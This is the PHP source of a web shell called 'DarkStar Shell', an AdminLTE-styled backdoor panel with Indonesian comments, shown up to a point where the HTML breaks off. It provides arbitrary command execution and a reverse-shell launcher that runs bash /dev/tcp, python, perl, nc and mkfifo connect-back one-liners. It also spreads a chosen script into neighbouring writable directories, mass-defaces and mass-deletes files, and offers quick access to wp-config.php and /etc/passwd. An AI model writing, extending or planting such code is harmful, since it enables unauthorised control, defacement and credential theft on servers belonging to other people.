<?php
// PASTIKAN TIDAK ADA SPASI, NEWLINE, ATAU KARAKTER LAIN DI BARIS INI ATAU SEBELUMNYA.
// PHP Configuration & Error Handling
set_time_limit(0); 
error_reporting(0); 

class DarkStarShell {
    // --- Configuration ---
    private $panel_title = "DarkStar Shell v4.5 - Admin LTE (Base64/OOP)";
    private $nick = "washere1337"; 
    private $auth_user = "panel"; 
    private $auth_pass = "panel";
    
    // --- State & Path Variables ---
    private $shell_root;
    private $path;
    private $message = '';
    private $is_ajax = false;
    private $user_info = ['user' => 'N/A', 'uid' => 'N/A', 'group' => 'N/A', 'gid' => '?'];

    public function __construct() {
        session_start();
        $this->is_ajax = isset($_REQUEST['is_ajax']);
        $this->shell_root = str_replace('\\','/', @getcwd());
        $this->initPath();
        $this->getSystemInfo();
    }

    // --- Core Helper Functions (HDD, EXE, Color) ---

    private function hdd($s) { 
        if($s >= 1073741824) return sprintf('%1.2f',$s / 1073741824 ).' GB'; 
        elseif($s >= 1048576) return sprintf('%1.2f',$s / 1048576 ) .' MB'; 
        elseif($s >= 1024) return sprintf('%1.2f',$s / 1024 ) .' KB'; 
        else return $s .' B'; 
    } 

    private function exe($cmd) { 
        if(function_exists('system')) { 
            @ob_start(); @system($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff; 
        } elseif(function_exists('exec')) { 
            @exec($cmd,$results); $buff = ""; 
            foreach($results as $result) { $buff .= $result . "\n"; } return $buff; 
        } elseif(function_exists('passthru')) { 
            @ob_start(); @passthru($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff; 
        } elseif(function_exists('shell_exec')) { 
            $buff = @shell_exec($cmd); return $buff; 
        }
        return "Error: Command execution failed or disabled.";
    } 

    private function getPermColor($perms) {
        $perms = substr($perms, -4);
        if (substr($perms, 1, 3) == '777' || substr($perms, 1, 3) == '0777') return 'danger';
        if (substr($perms, 1, 3) == '755' || substr($perms, 1, 3) == '0755') return 'success';
        if (substr($perms, 1, 3) == '644' || substr($perms, 1, 3) == '0644') return 'primary';
        if (substr($perms, 1, 3) == '666' || substr($perms, 1, 3) == '0666') return 'warning';
        return 'secondary';
    }

    private function initPath() {
        $path = $_GET['path'] ?? $this->shell_root; 
        $path = str_replace('\\','/',$path);
        $this->path = @realpath($path) ?: $this->shell_root; 
        @chdir($this->path);
    }
    
    private function getSystemInfo() {
        if(!function_exists('posix_getegid')) { 
            $this->user_info['user'] = @get_current_user() ?? 'N/A';
            $this->user_info['uid'] = @getmyuid() ?? 'N/A';
            $this->user_info['group'] = @getmygid() ?? 'N/A';
        } else { 
            $uid_info = @posix_getpwuid(posix_geteuid());
            $gid_info = @posix_getgrgid(posix_getegid());
            $this->user_info['user'] = $uid_info['name'] ?? 'N/A';
            $this->user_info['uid'] = $uid_info['uid'] ?? 'N/A';
            $this->user_info['group'] = $gid_info['name'] ?? 'N/A';
            $this->user_info['gid'] = $gid_info['gid'] ?? '?';
        } 
    }

    // --- Authentication ---

    private function authenticate() {
        if(isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

        $isAuthenticated = isset($_SESSION['authenticated']) && 
                           $_SESSION['authenticated'] == hash('sha512', $_SERVER['HTTP_USER_AGENT'] . $this->auth_pass);

        if (!$isAuthenticated) {
            if(isset($_POST['auth_user']) && $_POST['auth_user'] == $this->auth_user && $_POST['auth_pass'] == $this->auth_pass) {
                $_SESSION['authenticated'] = hash('sha512', $_SERVER['HTTP_USER_AGENT'] . $this->auth_pass);
                header("Location: ?"); 
                exit;
            } else {
                $this->renderLogin();
                exit();
            }
        }
    }

    // --- Action Handlers ---
    
    private function handleAjax() {
        if (!$this->is_ajax) return;

        $action = $_GET['do'] ?? '';
        $target = $_REQUEST['target'] ?? '';
        
        switch($action) {
            case 'get_content':
                if (ob_get_level() > 0) ob_clean(); 
                
                if(@is_readable($target) && is_file($target)) {
                    $content = @file_get_contents($target);
                    echo base64_encode($content); 
                } else { 
                    header('HTTP/1.1 404 Not Found'); 
                    echo base64_encode("Error: File not found or unreadable."); 
                }
                exit; 
            
            case 'save_content':
                if (ob_get_level() > 0) ob_clean(); 
                $encoded_content = $_POST['content'] ?? '';
                $content = base64_decode($encoded_content); 
                
                if (@file_put_contents($target, $content) !== false) {
                    echo 'Success: File saved successfully.';
                } else { 
                    header('HTTP/1.1 500 Internal Server Error'); 
                    echo 'Error: Failed to save file. Check permissions.'; 
                }
                exit;
                
            case 'terminal':
                if (ob_get_level() > 0) ob_clean();
                $command = $_POST['command'] ?? '';
                echo $this->exe($command);
                exit;

            default:
                exit;
        }
    }

    private function handleSabunBiasa() {
        $namafile = $_POST['namafile'] ?? '';
        $isi_script = $_POST['isi_script'] ?? '';
        $dir = $this->path;
        $count = 0;
        
        if (empty($namafile) || empty($isi_script)) {
            $this->message = "<div class='alert alert-danger'>Nama file dan Isi script tidak boleh kosong.</div>";
            $this->redirectWithMsg();
            return;
        }

        if(is_writable($dir)) {
            $dira = @scandir($dir);
            if ($dira === false) {
                 $this->message = "<div class='alert alert-danger'>Gagal membaca direktori: $dir</div>";
                 $this->redirectWithMsg();
                 return;
            }
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                if($dirb === '.') {
                    $lokasi = $dir . '/' . $namafile;
                    if (@file_put_contents($lokasi, $isi_script) !== false) $count++;
                } elseif($dirb === '..') {
                    $parent_dir = dirname($dir);
                    if ($parent_dir !== $dir) {
                        $lokasi = $parent_dir . '/' . $namafile;
                        if (@file_put_contents($lokasi, $isi_script) !== false) $count++;
                    }
                } elseif(is_dir($dirc)) {
                    if(is_writable($dirc)) {
                        $lokasi = $dirc.'/'.$namafile;
                        if (@file_put_contents($lokasi, $isi_script) !== false) $count++;
                    }
                }
            }
            $this->message = "<div class='alert alert-success'>Sabun Biasa Selesai. $count file '$namafile' berhasil disebarkan.</div>";
        } else {
            $this->message = "<div class='alert alert-danger'>Direktori saat ini tidak dapat ditulisi (Not Writable).</div>";
        }
        $this->redirectWithMsg();
    }

    private function handleReverseShell() {
        $ip = $_POST['rev_ip'] ?? '';
        $port = $_POST['rev_port'] ?? '';

        if (empty($ip) || empty($port) || !is_numeric($port)) {
            $this->message = "<div class='alert alert-danger'>IP dan Port tidak boleh kosong atau tidak valid.</div>";
            $this->redirectWithMsg();
            return;
        }

        $shells = [
            "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1",
            "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "nc -e /bin/sh {$ip} {$port}",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/f"
        ];
        
        $success = false;
        foreach ($shells as $cmd) {
            $output = $this->exe($cmd);
            if(empty($output) || strpos($output, 'command not found') === false) {
                 $success = true;
            }
        }

        if ($success) {
             $this->message = "<div class='alert alert-info'>Reverse Shell berhasil dieksekusi. Silakan cek listener Anda di <b>$ip:$port</b>.</div>";
        } else {
             $this->message = "<div class='alert alert-warning'>Reverse Shell dieksekusi, tetapi tidak ada koneksi yang terdeteksi atau semua perintah gagal dieksekusi.</div>";
        }
        $this->redirectWithMsg();
    }
    
    private function handlePhpInfo() {
        if (ob_get_level() > 0) ob_clean();
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>PHP Info</title></head><body>';
        @phpinfo();
        echo '</body></html>';
        exit;
    }
    
    private function handleCompression() {
        $action = $_POST['comp_action'] ?? ''; // 'compress' or 'decompress'
        $item = $_POST['comp_item'] ?? ''; // target file/dir name
        $output_name = $_POST['comp_output'] ?? ''; // output file name (for compress)
        
        $target = rtrim($this->path, '/') . '/' . basename($item);
        
        if (!file_exists($target)) {
            $this->message = "<div class='alert alert-danger'>Target item '$item' not found.</div>";
            $this->redirectWithMsg(); return;
        }

        if ($action == 'compress') {
            $output_path = rtrim($this->path, '/') . '/' . basename($output_name ?: (basename($item) . '.zip'));
            if (is_dir($target)) {
                $cmd = "zip -r " . escapeshellarg($output_path) . " " . escapeshellarg(basename($target));
                $message_text = "Directory '{$item}' compressed to '{$output_path}'";
            } elseif (is_file($target)) {
                $cmd = "zip " . escapeshellarg($output_path) . " " . escapeshellarg(basename($target));
                $message_text = "File '{$item}' compressed to '{$output_path}'";
            }
        } elseif ($action == 'decompress') {
            $cmd = "unzip " . escapeshellarg($target) . " -d " . escapeshellarg($this->path);
            $message_text = "File '{$item}' decompressed successfully to current directory.";
        } else {
            $this->message = "<div class='alert alert-danger'>Invalid compression action.</div>";
            $this->redirectWithMsg(); return;
        }

        $output = $this->exe($cmd);
        
        if (strpos($output, 'command not found') !== false || strpos($output, 'sh: ') !== false) {
             $this->message = "<div class='alert alert-warning'>Compression failed: Zip/Unzip command not available or failed. Output: <pre>".htmlspecialchars($output)."</pre></div>";
        } else {
             $this->message = "<div class='alert alert-success'>$message_text</div>";
        }
        $this->redirectWithMsg();
    }
    
    private function handleFindGrep() {
        $search_type = $_POST['search_type'] ?? 'file';
        $pattern = $_POST['search_pattern'] ?? '';
        $dir = $_POST['search_dir'] ?? $this->path;
        $output = '';

        if (empty($pattern)) {
            $this->message = "<div class='alert alert-danger'>Search pattern cannot be empty.</div>";
            $this->redirectWithMsg(); return;
        }
        
        $pattern_esc = "'" . str_replace("'", "'\"'\"'", $pattern) . "'";
        $dir_esc = escapeshellarg($dir);

        if ($search_type == 'file') {
            $cmd = "find " . $dir_esc . " -name " . $pattern_esc;
            $output_title = "Find Files matching '$pattern' in $dir";
        } elseif ($search_type == 'content') {
            $cmd = "grep -ril " . $pattern_esc . " " . $dir_esc . " 2>/dev/null"; 
            $output_title = "Grep Content matching '$pattern' in $dir (Files only)";
        }
        
        $output = $this->exe($cmd);
        
        $_SESSION['find_grep_results'] = ['title' => $output_title, 'output' => $output];
        $this->message = "<div class='alert alert-info'>Search executed. Check 'Find/Grep Results' tab.</div>";
        $this->redirectWithMsg();
    }
    // ------------------------------------

    private function handlePostActions() {
        $action = $_GET['do'] ?? '';
        $target = $_REQUEST['target'] ?? '';

        if(isset($_POST['do_create'])) {
            $item_name = trim($_POST['new_item_name']);
            $item_type = $_POST['item_type'];
            $new_path = rtrim($this->path, '/') . '/' . $item_name;

            if ($item_type == 'dir') { $result = @mkdir($new_path); $item_type_display = 'Directory'; } 
            else { $result = @file_put_contents($new_path, ''); $item_type_display = 'File'; }

            if($result) { $this->message = "<div class='alert alert-success'>$item_type_display created successfully: " . htmlspecialchars($item_name) . "</div>"; } 
            else { $this->message = "<div class='alert alert-danger'>Failed to create $item_type_display. Check permissions.</div>"; }
            $this->redirectWithMsg();
        }

        switch($action) {
            case 'sabun_biasa': $this->handleSabunBiasa(); break;
            case 'reverse_shell': $this->handleReverseShell(); break;
            case 'compression': $this->handleCompression(); break; // <-- BARU
            case 'find_grep': $this->handleFindGrep(); break; // <-- BARU
            case 'phpinfo': $this->handlePhpInfo(); break; // <-- BARU
            case 'download':
                if(@is_readable($target) && is_file($target)) {
                    if (ob_get_level() > 0) ob_clean();
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($target) . '"');
                    header('Content-Length: ' . filesize($target));
                    readfile($target); exit;
                } else { $this->message = "<div class='alert alert-danger'>File not found or unreadable.</div>"; }
                $this->redirectWithMsg(); 
                break;
            case 'delete':
                if(is_dir($target)) { $result = @rmdir($target); } else { $result = @unlink($target); }
                if($result) { $this->message = "<div class='alert alert-success'>File/Directory deleted successfully.</div>"; } 
                else { $this->message = "<div class='alert alert-danger'>Failed to delete.</div>"; }
                $this->redirectWithMsg(); break;
            case 'rename':
                $new_name = $_POST['new_name'] ?? '';
                $new_path = dirname($target) . '/' . $new_name;
                if($new_name && @rename($target, $new_path)) { $this->message = "<div class='alert alert-success'>Renamed successfully.</div>"; } 
                else { $this->message = "<div class='alert alert-danger'>Failed to rename.</div>"; }
                $this->redirectWithMsg(); break;
            case 'chmod':
                $perms_str = $_POST['perms'] ?? '';
                if (preg_match('/^[0-7]{3,4}$/', $perms_str)) {
                    $perms = octdec($perms_str);
                    if (@chmod($target, $perms)) { $this->message = "<div class='alert alert-success'>Permissions changed successfully.</div>"; } 
                    else { $this->message = "<div class='alert alert-danger'>Failed to change permissions.</div>"; }
                } else { $this->message = "<div class='alert alert-danger'>Invalid permission format.</div>"; }
                $this->redirectWithMsg(); break;
            case 'symlink':
                $link_name = $_POST['link_name'] ?? '';
                if ($link_name) {
                    $link_path = rtrim($this->path, '/') . '/' . $link_name;
                    if (@symlink($target, $link_path)) { $this->message = "<div class='alert alert-success'>Symlink created successfully.</div>"; } 
                    else { $this->message = "<div class='alert alert-danger'>Failed to create symlink.</div>"; }
                }
                $this->redirectWithMsg(); break;
            case 'mass_delete':
                $dir = $target; $pattern = $_POST['pattern'] ?? '*'; $count = 0;
                $this->recursiveDelete($dir, $pattern, $count);
                $this->message = "<div class='alert alert-success'>Mass Delete complete. Deleted $count files.</div>";
                $this->redirectWithMsg(); break;
            case 'mass_deface':
                $dir = $target; $pattern = $_POST['pattern'] ?? '*.html'; $content = $_POST['content'] ?? ''; $count = 0;
                if ($content) {
                    $this->recursiveDeface($dir, $pattern, $content, $count);
                    $this->message = "<div class='alert alert-success'>Mass Deface complete. Modified $count files.</div>";
                } else { $this->message = "<div class='alert alert-danger'>Mass Deface failed. Content cannot be empty.</div>"; }
                $this->redirectWithMsg(); break;
            case 'upload':
                if(isset($_FILES['file'])) {
                   $target_file = $this->path . '/' . basename($_FILES["file"]["name"]);
                   if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
                       $this->message = "<div class='alert alert-success'>File uploaded successfully.</div>";
                   } else {
                       $this->message = "<div class='alert alert-danger'>Failed to upload file. Check permissions.</div>";
                   }
                }
                $this->redirectWithMsg(); break;
        }
    }
    
    private function redirectWithMsg() {
        if (ob_get_level() > 0) ob_clean();
        echo "<script>window.location.href = '?path=" . urlencode($this->path) . "&msg=" . urlencode(strip_tags($this->message)) . "';</script>";
        exit;
    }
    
    private function recursiveDelete($dir, $pattern, &$count) {
        $items = @scandir($dir);
        if ($items === false) return;
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = rtrim($dir, '/') . '/' . $item;
            if (is_dir($full_path)) { $this->recursiveDelete($full_path, $pattern, $count); @rmdir($full_path); } 
            elseif (@fnmatch($pattern, $item)) { if (@unlink($full_path)) { $count++; } }
        }
    }

    private function recursiveDeface($dir, $pattern, $content, &$count) {
        $items = @scandir($dir);
        if ($items === false) return;
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = rtrim($dir, '/') . '/' . $item;
            if (is_dir($full_path)) { $this->recursiveDeface($full_path, $pattern, $content, $count); } 
            elseif (@fnmatch($pattern, $item) && @is_writable($full_path)) {
                if (@file_put_contents($full_path, $content) !== false) { $count++; }
            }
        }
    }

    private function renderLogin() {
        header('HTTP/1.1 401 Unauthorized');
        echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Login | Admin Shell</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/css/adminlte.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        </head><body class="hold-transition login-page dark-mode">
        <div class="login-box">
          <div class="card card-outline card-primary">
            <div class="card-header text-center"><h1>Admin <small class="text-secondary">Shell</small></h1></div>
            <div class="card-body">
              <p class="login-box-msg">Sign in to start your session</p>
              <form method="post">
                <div class="input-group mb-3">
                  <input type="text" name="auth_user" class="form-control" placeholder="Username" required>
                  <div class="input-group-append"><div class="input-group-text"><span class="fas fa-user"></span></div></div>
                </div>
                <div class="input-group mb-3">
                  <input type="password" name="auth_pass" class="form-control" placeholder="Password" required>
                  <div class="input-group-append"><div class="input-group-text"><span class="fas fa-lock"></span></div></div>
                </div>
                <div class="row"><div class="col-12"><button type="submit" class="btn btn-primary btn-block">Sign In</button></div></div>
              </form>
            </div>
          </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/js/adminlte.min.js"></script>
        </body></html>';
    }

    private function generateBreadcrumb() {
        $parts = explode('/', trim(str_replace($this->shell_root, '', $this->path), '/'));
        $output = '<nav aria-label="breadcrumb"><ol class="breadcrumb bg-gray-dark p-2 rounded-0">';
        $output .= '<li class="breadcrumb-item"><a href="?path=' . urlencode($this->shell_root) . '" class="text-light"><i class="fas fa-home"></i> Home</a></li>';
        $cumulative = $this->shell_root;
        foreach($parts as $index => $part) {
            if($part == '') continue;
            $cumulative .= '/' . $part;
            $output .= '<li class="breadcrumb-item text-truncate" style="max-width: 250px;">';
            $output .= '<a href="?path=' . urlencode($cumulative) . '" class="text-light">' . htmlspecialchars($part) . '</a>';
            $output .= '</li>';
        }
        $output .= '</ol></nav>';
        return $output;
    }
    
    private function renderFileManager() {
        ob_start();
        $files = @scandir($this->path); 
        
        if ($files === false) { 
            echo '<tr><td colspan="7" class="text-center text-danger py-4"><i class="fas fa-exclamation-triangle"></i> Access Denied. Directory is unreadable.</td></tr>';
            $files = []; 
        } else { 
            $parent_path = dirname($this->path);
            if ($this->path != $this->shell_root && $parent_path != $this->path) {
            ?>
                <tr>
                    <td><i class="fas fa-level-up-alt text-primary"></i></td>
                    <td colspan="6"><a href="?path=<?php echo urlencode($parent_path); ?>">.. (Parent Directory)</a></td>
                </tr>
            <?php 
            }
        }
            
        foreach ($files as $item) { 
            if ($item === '.' || $item === '..') continue;
            $fullpath = rtrim($this->path, '/') . '/' . $item; 
            $isDir = @is_dir($fullpath); $isReadable = @is_readable($fullpath);
            $size = ($isDir || !$isReadable) ? '-' : $this->hdd(@filesize($fullpath));
            $perms = @substr(sprintf('%o', @fileperms($fullpath)), -4) ?? '0000';
            $item_owner = @posix_getpwuid(@fileowner($fullpath))['name'] ?? @fileowner($fullpath) ?? 'N/A';
            $item_group = @posix_getgrgid(@filegroup($fullpath))['name'] ?? @filegroup($fullpath) ?? 'N/A';
            $modified = @date('Y-m-d H:i', @filemtime($fullpath)) ?? 'N/A';

            $esc_item        = htmlspecialchars($item, ENT_QUOTES, 'UTF-8');
            $esc_fullpath_js = rawurlencode($fullpath); 
            $esc_perms       = htmlspecialchars($perms, ENT_QUOTES, 'UTF-8');
        ?>
            <tr class="file-item">
                <td>
                    <?php if($isDir){ ?><i class="fas fa-folder text-warning"></i>
                    <?php } else { ?><i class="fas fa-file-code text-secondary"></i><?php } ?>
                </td>
                <td>
                    <?php if($isDir){ ?>
                        <a href="?path=<?php echo urlencode($fullpath); ?>" class="font-weight-bold text-light"><?php echo $esc_item; ?>/</a>
                    <?php } else { ?>
                        <?php echo $esc_item; ?>
                    <?php } ?>
                </td>
                <td><?php echo $size; ?></td>
                <td>
                    <button class="badge badge-<?php echo $this->getPermColor($perms); ?> btn-sm" 
                            onclick="showChmodModal('<?php echo $esc_fullpath_js; ?>', '<?php echo $esc_item; ?>', '<?php echo $esc_perms; ?>')" title="Change Permissions">
                        <?php echo $perms; ?> <i class="fas fa-key"></i>
                    </button>
                </td>
                <td><?php echo $item_owner . ':' . $item_group; ?></td>
                <td><?php echo $modified; ?></td>
                <td>
                    <div class="btn-group btn-group-sm">
                        <?php if(!$isDir && $isReadable){ ?>
                            <button class="btn btn-info" title="Edit" 
                                    onclick="editFile('<?php echo $esc_fullpath_js; ?>', '<?php echo $esc_item; ?>')">
                                <i class="fas fa-edit"></i>
                            </button>
                            <a href="?do=download&target=<?php echo rawurlencode($fullpath); ?>" class="btn btn-success" title="Download"><i class="fas fa-download"></i></a>
                        <?php } ?>
                        <button class="btn btn-primary" title="Rename" 
                                onclick="showRenameModal('<?php echo $esc_fullpath_js; ?>', '<?php echo $esc_item; ?>')">
                            <i class="fas fa-i-cursor"></i>
                        </button>
                        <a href="?do=delete&path=<?php echo rawurlencode($this->path); ?>&target=<?php echo rawurlencode($fullpath); ?>" 
                           onclick="return confirm('WARNING: Are you sure you want to delete \'<?php echo addslashes($esc_item); ?>\'?')"
                           class="btn btn-danger" title="Delete"><i class="fas fa-trash"></i>
                        </a>
                    </div>
                </td>
            </tr>
        <?php } 
        return ob_get_clean();
    }

    private function renderHTML() {
        $software = getenv("SERVER_SOFTWARE"); 
        $freespace = $this->hdd(@disk_free_space("/")); 
        $total = $this->hdd(@disk_total_space("/")); 
        $used = (@disk_total_space("/") !== false && @disk_free_space("/") !== false) ? $this->hdd(@disk_total_space("/") - @disk_free_space("/")) : "N/A";
        $php_memory = $this->hdd(@memory_get_usage(true));
        $path_encoded = urlencode($this->path);
        
        ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?php echo $this->panel_title; ?></title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/admin-lte@3.2/dist/css/adminlte.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .file-item:hover { background-color: #343a40 !important; cursor: pointer; }
        .console { background: #1e1e1e; color: #00ff00; font-family: 'Courier New', monospace; padding: 15px; border-radius: 5px; }
        .main-footer { font-size: 0.8rem; }
        .nav-sidebar .nav-link.active > i { color: #007bff !important; }
        .nav-sidebar .nav-item .nav-link { color: #c2c7d0; }
    </style>
</head>
<body class="hold-transition sidebar-mini layout-fixed dark-mode">
<div class="wrapper">
    <nav class="main-header navbar navbar-expand navbar-dark navbar-gray-dark">
        <ul class="navbar-nav">
            <li class="nav-item"><a class="nav-link" data-widget="pushmenu" href="#"><i class="fas fa-bars"></i></a></li>
            <li class="nav-item d-none d-sm-inline-block"><a href="#" class="nav-link"><i class="fas fa-microchip"></i> <?php echo @php_uname('s'); ?></a></li>
        </ul>
        <ul class="navbar-nav ml-auto">
            <li class="nav-item"><span class="nav-link text-success"><i class="fas fa-user-secret"></i> Logged in as: <?php echo htmlspecialchars($this->nick); ?></span></li>
            <li class="nav-item"><a href="?logout" class="nav-link text-danger"><i class="fas fa-power-off"></i> Logout</a></li>
        </ul>
    </nav>

    <aside class="main-sidebar sidebar-dark-primary elevation-4">
        <a href="?" class="brand-link">
            <span class="brand-text font-weight-light"><?php echo $this->panel_title; ?></span>
        </a>
        <div class="sidebar">
            <div class="user-panel mt-3 pb-3 mb-3 d-flex">
                <div class="info">
                    <a href="#" class="d-block text-warning"><i class="fas fa-user-shield"></i> User: <?php echo htmlspecialchars($this->user_info['user']); ?> (<?php echo htmlspecialchars($this->user_info['uid']); ?>)</a>
                    <a href="#" class="d-block text-info"><i class="fas fa-layer-group"></i> Group: <?php echo htmlspecialchars($this->user_info['group']); ?> (<?php echo htmlspecialchars($this->user_info['gid']); ?>)</a>
                </div>
            </div>
            
            <nav class="mt-2">
                <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu">
                    <?php 
                    $active_tab = isset($_SESSION['find_grep_results']) ? 'find_grep_results' : 'files';
                    ?>
                    <li class="nav-item"><a href="#files" class="nav-link <?php if($active_tab == 'files') echo 'active'; ?>" data-toggle="tab"><i class="nav-icon fas fa-folder-tree"></i><p>File Manager</p></a></li>
                    <li class="nav-item"><a href="#terminal" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-terminal"></i><p>Terminal</p></a></li>
                    <li class="nav-item"><a href="#tools" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-tools"></i><p>Tools & Attacks</p></a></li>
                    <li class="nav-item"><a href="#system" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-tachometer-alt"></i><p>System Info</p></a></li>
                    <li class="nav-header">Quick Access</li>
                    <?php if (isset($_SESSION['find_grep_results'])) { ?>
                    <li class="nav-item">
                        <a href="#find_grep_results" class="nav-link <?php if($active_tab == 'find_grep_results') echo 'active'; ?>" data-toggle="tab">
                            <i class="nav-icon fas fa-search text-warning"></i><p>Find/Grep Results</p>
                        </a>
                    </li>
                    <?php } ?>
                    <li class="nav-item">
                        <a href="#" class="nav-link" onclick="editFile('<?php echo urlencode($this->path . '/wp-config.php'); ?>', 'wp-config.php')">
                            <i class="nav-icon fas fa-file-invoice text-warning"></i><p>WP Config</p>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a href="#" class="nav-link" onclick="showSymlinkModal('/etc/passwd', 'passwd.txt')">
                            <i class="nav-icon fas fa-link text-danger"></i><p>Symlink /etc/passwd</p>
                        </a>
                    </li>
                </ul>
            </nav>
        </div>
    </aside>

    <div class="content-wrapper">
        <div class="content-header">
            <div class="container-fluid"><?php echo $this->generateBreadcrumb(); ?></div>
        </div>
        
        <section class="content">
            <div class="container-fluid">
                <?php 
                $msg = $_GET['msg'] ?? '';
                if ($msg) { echo "<div class='alert alert-success'>".htmlspecialchars($msg)."</div>"; }
                ?>
                
                <div class="row mb-3">
                    <div class="col-12 col-sm-6 col-md-4"><div class="info-box bg-gradient-dark"><span class="info-box-icon"><i class="fas fa-server"></i></span><div class="info-box-content"><span class="info-box-text">Software</span><span class="info-box-number"><?php echo htmlspecialchars($software); ?></span></div></div></div>
                    <div class="col-12 col-sm-6 col-md-4"><div class="info-box bg-gradient-dark"><span class="info-box-icon"><i class="fas fa-hdd"></i></span><div class="info-box-content"><span class="info-box-text">Disk Usage</span><span class="info-box-number">Used: <?php echo $used; ?> / Total: <?php echo $total; ?></span></div></div></div>
                    <div class="col-12 col-sm-6 col-md-4"><div class="info-box bg-gradient-dark"><span class="info-box-icon"><i class="fas fa-memory"></i></span><div class="info-box-content"><span class="info-box-text">PHP Memory</span><span class="info-box-number"><?php echo $php_memory; ?></span></div></div></div>
                </div>

                <div class="tab-content">
                    
                    <?php if (isset($_SESSION['find_grep_results'])) { ?>
                    <div class="tab-pane <?php if($active_tab == 'find_grep_results') echo 'active'; ?>" id="find_grep_results">
                        <div class="card card-dark">
                            <div class="card-header bg-secondary">
                                <h3 class="card-title"><i class="fas fa-search"></i> <?php echo htmlspecialchars($_SESSION['find_grep_results']['title']); ?></h3>
                                <div class="card-tools">
                                    <a href="?path=<?php echo $path_encoded; ?>&clear_grep=1" class="btn btn-sm btn-light"><i class="fas fa-times"></i> Clear Results</a>
                                </div>
                            </div>
                            <div class="card-body console">
                                <pre><?php echo htmlspecialchars($_SESSION['find_grep_results']['output']); ?></pre>
                            </div>
                        </div>
                    </div>
                    <?php } ?>
                    
                    <div class="tab-pane <?php if($active_tab == 'files') echo 'active'; ?>" id="files">
                        <div class="card card-dark">
                            <div class="card-header">
                                <h3 class="card-title"><i class="fas fa-folder-open"></i> File List: <?php echo htmlspecialchars($this->path); ?></h3>
                                <div class="card-tools">
                                    <button class="btn btn-sm btn-success mr-2" onclick="$('#uploadModal').modal('show')"><i class="fas fa-upload"></i> Upload</button>
                                    <button class="btn btn-sm btn-warning" onclick="$('#mkfileModal').modal('show')"><i class="fas fa-plus"></i> New File/Dir</button>
                                </div>
                            </div>
                            <div class="card-body p-0">
                                <div class="table-responsive">
                                    <table class="table table-hover table-sm">
                                        <thead class="thead-dark">
                                            <tr>
                                                <th width="30"></th>
                                                <th>Name</th>
                                                <th>Size</th>
                                                <th>Permissions</th>
                                                <th>Owner:Group</th>
                                                <th>Last Modified</th>
                                                <th width="220">Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php echo $this->renderFileManager(); ?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="tab-pane" id="terminal">
                        <div class="card card-dark">
                            <div class="card-header"><h3 class="card-title"><i class="fas fa-terminal"></i> Command Execution</h3></div>
                            <div class="card-body console">
                                <form id="terminalForm" onsubmit="return executeCommand(this)">
                                    <div class="input-group mb-3">
                                        <div class="input-group-prepend"><span class="input-group-text bg-dark text-light border-dark" id="pathPrefix">$ <?php echo htmlspecialchars($this->path); ?> ></span></div>
                                        <input type="text" class="form-control bg-dark text-light border-dark" name="command" id="commandInput" placeholder="Enter command (e.g., ls -la)" autocomplete="off" required>
                                        <div class="input-group-append"><button class="btn btn-outline-success" type="submit">Execute</button></div>
                                    </div>
                                    <input type="hidden" name="is_ajax" value="1">
                                </form>
                                <pre id="terminalOutput" style="min-height: 400px; max-height: 600px; overflow: auto; margin-top: 10px;"></pre>
                            </div>
                        </div>
                    </div>

                    <div class="tab-pane" id="tools">
                        <div class="row">
                            
                            <div class="col-md-4">
                                <div class="card card-dark card-outline">
                                    <div class="card-header bg-secondary"><h3 class="card-title"><i class="fas fa-search"></i> Find File & Grep Content</h3></div>
                                    <div class="card-body">
                                        <p class="text-secondary">Cari file berdasarkan nama atau teks di dalam file.</p>
                                        <form method="post" action="?do=find_grep&path=<?php echo $path_encoded; ?>">
                                            <div class="form-group"><label>Search Type</label>
                                                <select class="form-control bg-dark text-light" name="search_type" required>
                                                    <option value="file">Find File (by name, e.g., *.php)</option>
                                                    <option value="content">Grep Content (by text, e.g., password)</option>
                                                </select>
                                            </div>
